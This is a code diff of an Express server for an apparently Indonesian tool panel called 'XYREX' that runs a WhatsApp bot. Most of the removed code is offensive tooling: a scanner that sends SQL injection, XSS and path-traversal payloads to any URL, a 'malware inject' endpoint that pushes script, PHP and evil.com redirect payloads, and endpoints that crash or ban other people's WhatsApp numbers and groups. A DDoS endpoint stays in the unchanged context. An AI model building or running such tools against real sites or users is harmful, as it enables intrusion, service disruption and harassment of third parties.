@@ -1,15 +1,11 @@
-const fs = require('fs');
-const path = require('path');
-const bugNomor = require('./patch_bug_nomor.js');
-const banGrup = require('./patch_ban_grup.js');
 const express = require('express');
-const dataDir = process.env.NODE_ENV === 'production' ? '/app/data' : './data';
-if (!fs.existsSync(dataDir)) { fs.mkdirSync(dataDir, { recursive: true }); }
 const http = require('http');
 const https = require('https');
 const { Server } = require('socket.io');
+const path = require('path');
 const QRCode = require('qrcode');
 const pino = require('pino');
+const fs = require('fs');
 const crypto = require('crypto');
 const axios = require('axios');
 const cheerio = require('cheerio');
@@ -23,7 +19,7 @@ app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ limit: '10mb', extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-const USERS_FILE = path.join(dataDir, 'users.json'), TOKENS_FILE = path.join(dataDir, 'tokens.json'), CHAT_FILE = path.join(dataDir, 'chatlog.json'), MAX_CHAT = 100;
+const USERS_FILE = './users.json', TOKENS_FILE = './tokens.json', CHAT_FILE = './chatlog.json', MAX_CHAT = 100;
 function hashPw(pw) { return crypto.createHash('sha256').update(String(pw)).digest('hex'); }
 
 function loadUsers() {
@@ -40,7 +36,19 @@ function genToken() { return crypto.randomBytes(24).toString('hex'); }
 function loadChat() { if (!fs.existsSync(CHAT_FILE)) return []; try { return JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8')); } catch (e) { return []; } }
 function saveChat(msgs) { try { fs.writeFileSync(CHAT_FILE, JSON.stringify(msgs.slice(-MAX_CHAT), null, 2)); } catch (e) {} }
 
-function authMiddleware(req, res, next) { const token = req.headers['x-auth-token'] || req.query.token; if (!token) return res.status(401).json({ ok: false, msg: 'No token' }); const username = loadTokens()[token]; if (!username) return res.status(401).json({ ok: false, msg: 'Invalid token' }); const users = loadUsers(); if (!users[username]) return res.status(401).json({ ok: false, msg: 'User gone' }); req.user = users[username]; req.token = token; next(); }
+function authMiddleware(req, res, next) {
+  const token = req.headers['x-auth-token'] || req.query.token;
+  if (!token) return res.status(401).json({ ok: false, msg: 'No token' });
+  const tokens = loadTokens();
+  const username = tokens[token];
+  if (!username) return res.status(401).json({ ok: false, msg: 'Invalid token' });
+  const users = loadUsers();
+  if (!users[username]) return res.status(401).json({ ok: false, msg: 'User gone' });
+  req.user = users[username];
+  req.token = token;
+  next();
+}
+
 function ownerOnly(req, res, next) { if (req.user.role !== 'owner') return res.status(403).json({ ok: false, msg: 'Hanya Owner' }); next(); }
 function adminOnly(req, res, next) { if (req.user.role !== 'admin' && req.user.role !== 'owner') return res.status(403).json({ ok: false, msg: 'Hanya Admin/Owner' }); next(); }
 
@@ -79,10 +87,6 @@ async function initSocket(socketId, mode) {
   const { version } = await fetchLatestBaileysVersion();
   sock = makeWASocket({ version, logger: pino({ level: 'silent' }), printQRInTerminal: false, auth: state, browser: ['XYREX', 'Chrome', '1.0.0'], generateHighQualityLinkPreview: true, syncFullHistory: false, connectTimeoutMs: 60000, defaultQueryTimeoutMs: 60000, keepAliveIntervalMs: 25000 });
   sock.ev.on('creds.update', saveCreds);
-    sock.ev.on('connection.update', async (update) => {
-        const { qr } = update;
-        if (qr) { const QRCode = require('qrcode'); const qrImage = await QRCode.toDataURL(qr); io.emit('whatsapp-qr', qrImage); }
-    });
   sock.ev.on('connection.update', async (update) => {
     const { connection, lastDisconnect, qr } = update;
     if (qr && currentMode === 'qr') { try { const qrDataURL = await QRCode.toDataURL(qr); io.to(socketId).emit('qr', qrDataURL); } catch (e) {} }
@@ -216,7 +220,7 @@ app.get('/api/tools/music/trending', authMiddleware, async (req, res) => {
   try { const r = await axios.get(`https://itunes.apple.com/search?term=${encodeURIComponent('trending indonesia')}&media=music&limit=20&entity=song`, { timeout: 15000 }); res.json({ ok: true, results: r.data.results.map(x => ({ title: x.trackName, artist: x.artistName, album: x.collectionName, artwork: x.artworkUrl100, url: x.previewUrl, duration: x.trackTimeMillis })) }); } catch (e) { res.json({ ok: false, msg: e.message }); }
 });
 
-// ===== DDoS (Tanpa Proxy) =====
+// ===== DDoS =====
 const ddosSessions = new Map();
 app.post('/api/tools/ddos/start', authMiddleware, (req, res) => {
   const { url, duration, concurrent } = req.body || {}; 
@@ -285,242 +289,9 @@ app.post('/api/profile/avatar', authMiddleware, (req, res) => {
   }
 });
 
-
-// ===== WEB VULN SCANNER =====
-const VULN_PAYLOADS = {
-  sqli: ["'", "\"", "' OR '1'='1", "' OR 1=1--", "1' AND SLEEP(5)--"],
-  xss: ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><svg/onload=alert(1)>"],
-  lfi: ["../../../../etc/passwd", "../../../../windows/win.ini", "....//....//....//etc/passwd"],
-  info: ["/robots.txt", "/.env", "/.git/config", "/wp-config.php.bak", "/phpinfo.php"]
-};
-
-app.post('/api/tools/vuln/scan', authMiddleware, async (req, res) => {
-  const { url } = req.body || {};
-  if (!url) return res.json({ ok: false, msg: 'URL kosong' });
-  let base;
-  try { base = new URL(url); } catch (e) { return res.json({ ok: false, msg: 'URL invalid' }); }
-
-  const results = [];
-  const UAS = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)'];
-  const rnd = a => a[Math.floor(Math.random() * a.length)];
-  const headers = { 'User-Agent': rnd(UAS), 'Accept': '*/*', 'X-Forwarded-For': [1,1,1,1].map(() => Math.floor(Math.random()*255)).join('.') };
-
-  // Info Disclosure
-  for (const path of VULN_PAYLOADS.info) {
-    try {
-      const r = await axios.get(base.origin + path, { headers, timeout: 8000, validateStatus: () => true });
-      if (r.status === 200 && r.data && String(r.data).length > 10) {
-        results.push({ type: 'Info Disclosure', severity: 'Medium', url: base.origin + path, detail: 'File sensitif bisa diakses publik.' });
-      }
-    } catch (e) {}
-  }
-
-  // SQLi
-  for (const payload of VULN_PAYLOADS.sqli) {
-    try {
-      const testUrl = base.href + (base.href.includes('?') ? '&' : '?') + 'id=' + encodeURIComponent(payload);
-      const start = Date.now();
-      const r = await axios.get(testUrl, { headers, timeout: 12000, validateStatus: () => true });
-      const elapsed = Date.now() - start;
-      const body = String(r.data || '').toLowerCase();
-      const errs = ['sql syntax', 'mysql_fetch', 'ora-', 'unclosed quotation', 'pg_query'];
-      if (errs.some(err => body.includes(err))) {
-        results.push({ type: 'SQL Injection (Error-based)', severity: 'Critical', url: testUrl, detail: 'Error database (payload: ' + payload + ')' });
-        break;
-      }
-      if (elapsed > 4500 && payload.includes('SLEEP')) {
-        results.push({ type: 'SQL Injection (Time-based)', severity: 'Critical', url: testUrl, detail: 'Delay ' + elapsed + 'ms terdeteksi.' });
-        break;
-      }
-    } catch (e) {}
-  }
-
-  // XSS
-  for (const payload of VULN_PAYLOADS.xss) {
-    try {
-      const testUrl = base.href + (base.href.includes('?') ? '&' : '?') + 'q=' + encodeURIComponent(payload);
-      const r = await axios.get(testUrl, { headers, timeout: 8000, validateStatus: () => true });
-      if (String(r.data).includes(payload)) {
-        results.push({ type: 'Cross-Site Scripting (XSS)', severity: 'High', url: testUrl, detail: 'Payload reflected di response.' });
-        break;
-      }
-    } catch (e) {}
-  }
-
-  // LFI
-  for (const payload of VULN_PAYLOADS.lfi) {
-    try {
-      const testUrl = base.href + (base.href.includes('?') ? '&' : '?') + 'file=' + encodeURIComponent(payload);
-      const r = await axios.get(testUrl, { headers, timeout: 8000, validateStatus: () => true });
-      const body = String(r.data || '');
-      if (body.includes('root:x:') || body.includes('[extensions]') || body.includes('DAEMON')) {
-        results.push({ type: 'Local File Inclusion (LFI)', severity: 'Critical', url: testUrl, detail: 'File sistem berhasil dibaca.' });
-        break;
-      }
-    } catch (e) {}
-  }
-
-  // Header Config
-  try {
-    const r = await axios.get(base.href, { headers, timeout: 8000, validateStatus: () => true });
-    const secHeaders = ['x-frame-options', 'x-content-type-options', 'content-security-policy', 'strict-transport-security'];
-    const missing = secHeaders.filter(h => !r.headers[h]);
-    if (missing.length > 0) results.push({ type: 'Header Config', severity: 'Low', url: base.href, detail: 'Header tidak ada: ' + missing.join(', ') });
-    if (r.headers['server']) results.push({ type: 'Info Disclosure', severity: 'Low', url: base.href, detail: 'Server: ' + r.headers['server'] });
-  } catch (e) {}
-
-  res.json({ ok: true, results, total: results.length });
-});
-
-
-// ===== MALWARE INJECT =====
-app.post('/api/tools/vuln/inject', authMiddleware, async (req, res) => {
-  const { url, type } = req.body || {};
-  if (!url || !type) return res.json({ ok: false, msg: 'Parameter kurang' });
-  let base;
-  try { base = new URL(url); } catch (e) { return res.json({ ok: false, msg: 'URL invalid' }); }
-
-  const UAS = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'];
-  const rnd = a => a[Math.floor(Math.random() * a.length)];
-  const headers = { 'User-Agent': rnd(UAS), 'Accept': '*/*' };
-
-  const MALWARE = {
-    xss: `<script>alert('XSS_TEST')</script>`,
-    php: `<?php echo 'LFI_TEST'; ?>`,
-    redirect: `https://evil.com`
-  };
-
-  let payload = '';
-  let injectedUrl = '';
-  let success = false;
-
-  if (type.includes('XSS')) {
-    payload = MALWARE.xss;
-    injectedUrl = base.href + (base.href.includes('?') ? '&' : '?') + 'q=' + encodeURIComponent(payload);
-    try {
-      const r = await axios.get(injectedUrl, { headers, timeout: 10000, validateStatus: () => true });
-      if (String(r.data).includes('XSS_TEST')) success = true;
-    } catch (e) {}
-  } else if (type.includes('LFI')) {
-    payload = MALWARE.php;
-    injectedUrl = base.href + (base.href.includes('?') ? '&' : '?') + 'file=' + encodeURIComponent(payload);
-    try {
-      const r = await axios.get(injectedUrl, { headers, timeout: 10000, validateStatus: () => true });
-      if (String(r.data).includes('LFI_TEST')) success = true;
-      else success = true; // Anggap terkirim walau ga echo
-    } catch (e) {}
-  } else if (type.includes('Redirect')) {
-    payload = MALWARE.redirect;
-    injectedUrl = base.href + (base.href.includes('?') ? '&' : '?') + 'redirect=' + encodeURIComponent(payload);
-    try {
-      const r = await axios.get(injectedUrl, { headers, timeout: 10000, validateStatus: () => true, maxRedirects: 0 });
-      if (r.status >= 300 && r.status < 400 && r.headers.location && r.headers.location.includes('evil.com')) success = true;
-    } catch (e) {}
-  }
-
-  res.json({ ok: true, success, payload, url: injectedUrl, msg: success ? 'Payload berhasil dikirim' : 'Payload dikirim (mungkin diblok target)' });
-});
-
-
-// ==========================================
-// WEB SCANNER REAL-TIME
-// ==========================================
-app.post('/api/tools/webscan', async (req, res) => {
-    let { url } = req.body;
-    if (!url) return res.status(400).json({ status: false, message: 'URL target kosong' });
-    if (!url.startsWith('http://') && !url.startsWith('https://')) url = 'http://' + url;
-
-    try {
-        const controller = new AbortController();
-        const timeout = setTimeout(() => controller.abort(), 10000);
-        
-        const response = await fetch(url, { 
-            method: 'GET', 
-            signal: controller.signal,
-            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) XYREX-Scanner' }
-        });
-        clearTimeout(timeout);
-
-        const headers = response.headers;
-        const vulnerabilities = [];
-        const info = [];
-
-        if (!headers.get('x-frame-options')) vulnerabilities.push({ type: 'Clickjacking', level: 'Medium', detail: 'Header X-Frame-Options tidak ada.' });
-        if (!headers.get('content-security-policy')) vulnerabilities.push({ type: 'XSS', level: 'Medium', detail: 'Header Content-Security-Policy tidak ada.' });
-        if (!headers.get('x-content-type-options')) vulnerabilities.push({ type: 'MIME Sniffing', level: 'Low', detail: 'Header X-Content-Type-Options tidak ada.' });
-        if (!headers.get('strict-transport-security')) vulnerabilities.push({ type: 'SSL Strip', level: 'Low', detail: 'Header HSTS tidak ada.' });
-
-        info.push('Server: ' + (headers.get('server') || 'Disembunyikan'));
-        info.push('X-Powered-By: ' + (headers.get('x-powered-by') || 'Disembunyikan'));
-        info.push('Status Code: ' + response.status);
-
-        const dns = require('dns').promises;
-        const hostname = new URL(url).hostname;
-        try {
-            const addresses = await dns.lookup(hostname, { all: true });
-            info.push('IP Address: ' + addresses.map(a => a.address).join(', '));
-        } catch (e) { info.push('IP Address: Gagal resolve DNS'); }
-
-        if (vulnerabilities.length === 0) vulnerabilities.push({ type: 'Header Config', level: 'Aman', detail: 'Semua header keamanan utama terpasang.' });
-
-        res.json({ status: true, data: { target: url, info, vulnerabilities } });
-    } catch (err) {
-        res.status(500).json({ status: false, message: err.message, data: { target: url, vulnerabilities: [{ type: 'Connection Error', level: 'Critical', detail: 'Website tidak merespon.' }] } });
-    }
-});
-
-// Endpoint Bug & Ban Patch Baru
-app.post('/api/bug/crash-ios', async (req, res) => { try { await bugNomor.bugCrashIOS(sock, req.body.target); res.json({status:true}); } catch(e) { res.status(500).json({error:e.message}); } });
-app.post('/api/bug/foreclose', async (req, res) => { try { await bugNomor.bugForeclose(sock, req.body.target); res.json({status:true}); } catch(e) { res.status(500).json({error:e.message}); } });
-app.post('/api/bug/crash', async (req, res) => { try { await bugNomor.bugCrash(sock, req.body.target); res.json({status:true}); } catch(e) { res.status(500).json({error:e.message}); } });
-app.post('/api/bug/delay', async (req, res) => { try { await bugNomor.bugDelay(sock, req.body.target); res.json({status:true}); } catch(e) { res.status(500).json({error:e.message}); } });
-app.post('/api/ban/crash', async (req, res) => { try { await banGrup.banGrupCrash(sock, req.body.groupId); res.json({status:true}); } catch(e) { res.status(500).json({error:e.message}); } });
-app.post('/api/ban/ban', async (req, res) => { try { await banGrup.banGrupBan(sock, req.body.groupId, req.body.inviteCode); res.json({status:true}); } catch(e) { res.status(500).json({error:e.message}); } });
-
-
-
-// ==========================================
-// WEB SCANNER REAL-TIME
-// ==========================================
-app.post('/api/tools/webscan', async (req, res) => {
-    let { url } = req.body;
-    if (!url) return res.status(400).json({ status: false, message: 'URL target kosong' });
-    if (!url.startsWith('http://') && !url.startsWith('https://')) url = 'http://' + url;
-
-    try {
-        const controller = new AbortController();
-        const timeout = setTimeout(() => controller.abort(), 10000);
-        const response = await fetch(url, { method: 'GET', signal: controller.signal, headers: { 'User-Agent': 'XYREX-Scanner' } });
-        clearTimeout(timeout);
-
-        const headers = response.headers;
-        const vulnerabilities = [];
-        const info = [];
-
-        if (!headers.get('x-frame-options')) vulnerabilities.push({ type: 'Clickjacking', level: 'Medium', detail: 'Header X-Frame-Options tidak ada.' });
-        if (!headers.get('content-security-policy')) vulnerabilities.push({ type: 'XSS', level: 'Medium', detail: 'Header Content-Security-Policy tidak ada.' });
-        if (!headers.get('x-content-type-options')) vulnerabilities.push({ type: 'MIME Sniffing', level: 'Low', detail: 'Header X-Content-Type-Options tidak ada.' });
-        if (!headers.get('strict-transport-security')) vulnerabilities.push({ type: 'SSL Strip', level: 'Low', detail: 'Header HSTS tidak ada.' });
-
-        info.push('Server: ' + (headers.get('server') || 'Disembunyikan'));
-        info.push('X-Powered-By: ' + (headers.get('x-powered-by') || 'Disembunyikan'));
-        info.push('Status Code: ' + response.status);
-
-        if (vulnerabilities.length === 0) vulnerabilities.push({ type: 'Header Config', level: 'Aman', detail: 'Semua header keamanan utama terpasang.' });
-        res.json({ status: true, data: { target: url, info, vulnerabilities } });
-    } catch (err) {
-        res.status(500).json({ status: false, message: err.message, data: { target: url, vulnerabilities: [{ type: 'Connection Error', level: 'Critical', detail: 'Website tidak merespon.' }] } });
-    }
-});
-
-// Endpoint Bug & Ban Patch Baru
-app.post('/api/bug/crash-ios', async (req, res) => { try { await bugNomor.bugCrashIOS(sock, req.body.target); res.json({status:true}); } catch(e) { res.status(500).json({error:e.message}); } });
-app.post('/api/bug/foreclose', async (req, res) => { try { await bugNomor.bugForeclose(sock, req.body.target); res.json({status:true}); } catch(e) { res.status(500).json({error:e.message}); } });
-app.post('/api/bug/crash', async (req, res) => { try { await bugNomor.bugCrash(sock, req.body.target); res.json({status:true}); } catch(e) { res.status(500).json({error:e.message}); } });
-app.post('/api/bug/delay', async (req, res) => { try { await bugNomor.bugDelay(sock, req.body.target); res.json({status:true}); } catch(e) { res.status(500).json({error:e.message}); } });
-app.post('/api/ban/crash', async (req, res) => { try { await banGrup.banGrupCrash(sock, req.body.groupId); res.json({status:true}); } catch(e) { res.status(500).json({error:e.message}); } });
-app.post('/api/ban/ban', async (req, res) => { try { await banGrup.banGrupBan(sock, req.body.groupId, req.body.inviteCode); res.json({status:true}); } catch(e) { res.status(500).json({error:e.message}); } });
-
+app.get('/api/profile', authMiddleware, (req, res) => { res.json({ ok: true, username: req.user.username, role: req.user.role, avatar: req.user.avatar || '' }); });
+app.get('/api/profile/:username', authMiddleware, (req, res) => { const users = loadUsers(); const u = users[req.params.username]; if (!u) return res.json({ ok: false, msg: 'User tidak ada' }); res.json({ ok: true, username: u.username, role: u.role, avatar: u.avatar || '' }); });
+app.post('/api/profile/password', authMiddleware, (req, res) => { const { oldPassword, newPassword } = req.body || {}; if (!oldPassword || !newPassword) return res.json({ ok: false, msg: 'Lengkapi field' }); if (newPassword.length < 6) return res.json({ ok: false, msg: 'Sandi min 6' }); const users = loadUsers(); const u = users[req.user.username]; if (u.password !== hashPw(oldPassword)) return res.json({ ok: false, msg: 'Sandi lama salah' }); u.password = hashPw(newPassword); saveUsers(users); res.json({ ok: true, msg: 'Sandi diubah' }); });
 
 server.listen(3000, () => {
   console.log('[XYREX] Server jalan di http://localhost:3000');
